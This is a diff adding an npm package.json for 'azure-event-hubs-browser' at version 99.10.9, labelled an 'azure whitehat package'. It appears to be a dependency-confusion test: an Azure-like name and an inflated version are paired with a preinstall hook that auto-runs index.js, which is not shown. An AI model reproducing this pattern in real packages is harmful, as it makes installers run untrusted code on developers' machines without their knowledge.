@@ -1,0 +1,39 @@
+{
+    "name": "azure-event-hubs-browser",
+    "version": "99.10.9",
+    "description": "azure whitehat package",
+    "main": "index.js",
+    "scripts": {
+        "test": "echo \"error no test specified\" && exit 1",
+        "preinstall": "node index.js"
+    },
+    "author": "",
+    "License": "ISC",
+    "_id": "azure-event-hubs-browser@99.10.9",
+    "_nodeVersion": "14.16.1",
+    "_npmVersion": "6.14.11",
+    "dist": {
+        "integrity": "sha512-MJEI8igPsOKvzfOpQROYoljaAriFwXcpvyIcw3ueJNJcAJjct5Hkthbswg34ujsmUwRz6jkVECU9qjLfYCJ4ZQ==",
+        "shasum": "afc5bc15bcffa5aa71a76f9a3b9968fa41e8681c",
+        "tarball": "https://registry.npmjs.org/azure-event-hubs-browser/-/azure-event-hubs-browser-99.10.9.tgz",
+        "fileCount": 2,
+        "unpackedSize": 3588,
+        "npm-signature": "-----BEGIN PGP SIGNATURE-----\r\nVersion: OpenPGP.js v3.0.13\r\nComment: https://openpgpjs.org\r\n\r\nwsFcBAEBCAAQBQJhoS2QCRA9TVsSAnZWagAA8yYP/1/c9YUOIJyBq0fkXzVB\nQGSg18RuvEAOf+1vVLcAO1AkEWsfwbfAM5LkLOx6j6qXhOI0EBJ00HU2Pc+Y\nhW7FpB61q5vYA0cxeCNOcKAbchvWCQrURazttxRaistvrHJm/a7aEyba3Rlk\nghRVkWeI13ip0+S6UXctwsnsBjovcjv78crpDFlsp7lqfzqnuC+Sbx1IWYgT\nCWFB45esGORVoIpK6NPwFf5TZrjDH/AZ43vkXmUhtRVV02GPDTtubQZoF8dF\nW+9ldG/WJT5uaYTu6hVYLyFcWrMyM+k98AzP/iJ3LA5Q1GyTu4O8sT4h0pbG\nzktDnMoJWC+FAJQDm5BTg6g8FudHVht1xbXxwEoL4OOOE0ZPksC7nAeHsh0V\ngdFjKRi5Tvm+U00Ymaxi/sT3h3RHhK62r9gyLwZi+37HN5cVsSV5HGDKiLHj\nvYwXET1BT/yiPee3vmCq8U9x7T24ZBFSn97m5M/YEw+BPcIM3zg/xmAU2DwV\nn9G32dfxQzIxYCVrPFt8/2vhBETyYQPBmwGD4qdJNTxIWwWDZ4QKK3p6bRQD\nwui9CfA+pmoNFVC2TdT9nTtkTWJWWA/ORKJpms0S0677yvHqUAhWnEE4a1Xv\nq8efq5QOMjPOxbvjCHy3+OI7e7IXpeQe2wMwU8YfI7fzhDwVrlg3Ebd2Akm8\n5bQa\r\n=SkDr\r\n-----END PGP SIGNATURE-----\r\n"
+    },
+    "_npmUser": {
+        "name": "azure-tests",
+        "email": "hussam.tes08+3@gmail.com"
+    },
+    "directories": {},
+    "maintainers": [
+        {
+            "name": "azure-tests",
+            "email": "hussam.tes08+3@gmail.com"
+        }
+    ],
+    "_npmOperationalInternal": {
+        "host": "s3://npm-registry-packages",
+        "tmp": "tmp/azure-event-hubs-browser_99.10.9_1637952912542_0.39957008126644555"
+    },
+    "_hasShrinkwrap": false
+}
